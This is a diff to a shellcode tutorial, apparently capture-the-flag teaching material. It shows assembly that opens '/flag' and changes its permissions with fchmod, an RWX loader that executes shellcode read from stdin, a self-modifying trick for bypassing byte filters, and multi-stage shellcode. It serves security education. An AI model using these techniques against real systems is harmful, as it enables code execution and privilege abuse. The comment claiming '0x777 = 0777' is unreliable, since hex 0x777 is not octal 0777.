@@ -256,27 +256,19 @@ Similarly, we can write a shellcode that can change the permissions of a file. F
 ```asm
 
 mov rbx, 0x00000067616c662f # push "/flag" filename
-
 push rbx
-
 mov rax, 2 # syscall number of open
 
 mov rdi, rsp # point the first argument at stack (where we have "/flag")
-
 mov rsi, 0 # NULL out the second argument (meaning, O_RDONLY)
-
 syscall # trigger open("/flag", NULL)
 
 mov rdi, rax # first argument to fchmod is the file descriptor returned by open
-
 mov rsi, 0x777 # second argument is the new permissions (0x777 = 0777 = rwxrwxrwx)
-
 mov rax, 94 # syscall number of fchmod
-
 syscall # trigger fchmod(fd, 0x777)
 
 mov rax, 60 # syscall number of exit
-
 syscall # trigger exit()
 
 ```
@@ -290,9 +282,7 @@ We can build our shellcode using any assembler like `as` or `nasm` assembler. Fo
   
 
 ```bash
-
 nasm -f elf64 shellcode.asm
-
 ```
 
 and then we need to extract only the text section of the shellcode as it is the only section that contains the shellcode. We can do that using:
@@ -300,9 +290,7 @@ and then we need to extract only the text section of the shellcode as it is the 
   
 
 ```bash
-
 objcopy -O binary -j .text shellcode.o shellcode.bin
-
 ```
 
 Now `shellcode.bin` contains the shellcode that we can use in our exploit.
@@ -316,13 +304,9 @@ We can run our shellcode by replicating the exotic conditions that are required 
   
 
 ```bash
-
 echo "flag" > flag
-
 chmod 777 flag
-
 ./shellcode.bin
-
 ```
 
   
@@ -332,21 +316,15 @@ chmod 777 flag
 If we are to replicate exotic conditions in ways that are too hard to do as a preamble for your shellcode, we can build a shellcode loader in C:
 
 ```c
-
 page = mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
-
 read(0, page, 0x1000);
-
 ((void(*)())page)();
-
 ```
 
 Then
 
 ```bash
-
 cat shellcode-raw | ./tester
-
 ```
 
 ### Debugging Shellcode
@@ -358,9 +336,7 @@ We can debug our shellcode using `gdb` debugger. For example, we can debug the s
   
 
 ```bash
-
 gdb ./shellcode.bin
-
 ```
 
   
@@ -372,31 +348,26 @@ To see if things are working from a high level, we can trace our shellcode with 
   
 
 ```bash
-
 strace ./shellcode.bin
-
 ```
 
 This can show you, at a high level, what your shellcode is doing (or not doing!).
 
-  
 
 ### Shellcode for other architectures
 
 We can write shellcode for any architecture using cross-assemblers. Our way of building shellcode translates well to other architectures:
 
-**amd64:** `gcc -nostdlib -static shellcode.s -o shellcode-elf`
+- **amd64:** `gcc -nostdlib -static shellcode.s -o shellcode-elf`
 
-**mips:** `mips-linux-gnu-gcc -nostdlib shellcode-mips.s -o shellcode-mips-elf`
+- **mips:** `mips-linux-gnu-gcc -nostdlib shellcode-mips.s -o shellcode-mips-elf`
 
 Similarly, we can run cross-architecture shellcode with an emulator:
 
-**amd64:** `./shellcode`
+- **amd64:** `./shellcode`
 
-**mips:** `qemu-mips-static ./shellcode-mips`
+- **mips:** `qemu-mips-static ./shellcode-mips`
 
-  
-  
 
 ### Common Challenges
 
@@ -456,20 +427,14 @@ For instance, we can write a shellcode that avoids those forbidden bytes like:
 If the constraints on your shellcode are too hard to get around with clever synonyms, but the page where your shellcode is mapped is writable, you can use a technique called *code == data* to bypass the filter. For example, if we are restricted to use `0xcc` byte that is trap instruction `int3`, we can use the following technique to bypass the filter:
 
 ```asm
-
 inc BYTE PTR [rip]
-
 .byte 0xcb
-
 ```
 
 This will increment the byte at the address of the next instruction, which is the `0xcb` byte. This will cause the `int3` instruction to be executed, which is the same as `0xcc`. This technique can be used to bypass any filter that prevents you from using a specific byte.
 
-  
-
 > 💡 **Note:**
 >When testing this, you'll need to make sure .text is writable:
-
 > `gcc -Wl,-N --static -nostdlib -o test test.s`
 
   
@@ -479,23 +444,15 @@ This will increment the byte at the address of the next instruction, which is th
 Sometimes, there are very complex constraints on our shellcode, which might make it hard to do anything useful. In this situation, we can use a *multi-stage shellcode*. This is a shellcode that loads another shellcode in stage 1 (*let's say*) and executes it in stage 2. For example:
 
 ```c
-
 /* Stage 1 */
-
 read(0, rip, 1000)
-
 // getting your current instruction pointer might be hard, depending on the architecture
-
 // on amd64, you can do it with lea rax, [rip]
 
 // a read like this will overwrite the rest of your shellcode with unfiltered data!
 
-  
-
 /* Stage 2 */
-
 // Here is the actuall shellcode that you want to execute
-
 ```
 
   
